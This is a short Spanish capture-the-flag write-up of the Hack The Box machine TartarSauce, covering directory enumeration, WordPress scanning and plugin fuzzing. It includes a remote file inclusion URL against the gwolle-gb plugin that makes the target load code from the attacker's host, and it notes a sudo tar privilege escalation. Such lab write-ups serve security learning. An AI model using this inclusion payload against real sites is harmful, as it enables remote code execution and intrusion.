# TartarSauce-HTB

## Nmap

![image](https://github.com/gecr07/TartarSauce-HTB/assets/63270579/c7ffdab0-afe6-4080-938b-002e3fc39235)

## Dirbuster

Para encontrar lo que sea es de las mejores tools aunque aveces de tantas peticiones llena los logs lo que hace que las maquinas no funcionen como deberian.

```
dirbuster -u http://10.129.1.185/ -t 200 -l /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -r dirout.ext -e php,txt,html
```

Todo lo demas que se encuentra en robots.txt son rabbit holes porquen o se puede hacer nada. Se encontro un WP 

### WP scan

Esta herramienta ayuda a enumerar el WP sin embargo, en esta ocacion no me detecto nada!

```
wpscan --detection-mode aggressive -e u,p --url http://10.129.1.185/webservices/wp 
```

Un check que siempre tienes que hacer es ver si tiene plugins aunque no encontro nada wpscan checa a ver si estan en el directorio donde siempre estan  aparte fuzzea 


```
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt  http://10.129.1.185/webservices/wp/FUZZ 
```

![image](https://github.com/gecr07/TartarSauce-HTB/assets/63270579/f2fec32d-79c9-4394-b184-0b9501cf9041)


![image](https://github.com/gecr07/TartarSauce-HTB/assets/63270579/3f211fe4-93f0-4483-b8a8-11e398930402)


## RCE 

Buscamos y un plugin parece vulnerable.

![image](https://github.com/gecr07/TartarSauce-HTB/assets/63270579/3d793bf5-6436-4edc-bb21-b183dc781556)

```
http://10.129.1.185/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.108
```

## Privilege Esc

Lo que apredi en est maquina es que no importa que no tengas credenciales siempre intenta el sudo -l. Nos damos cuenta que se puede ejecutar tar con privilegios de otro usuario


![image](https://github.com/gecr07/TartarSauce-HTB/assets/63270579/0bc1f184-2c6d-41e1-addd-98af3f35c7cb)






























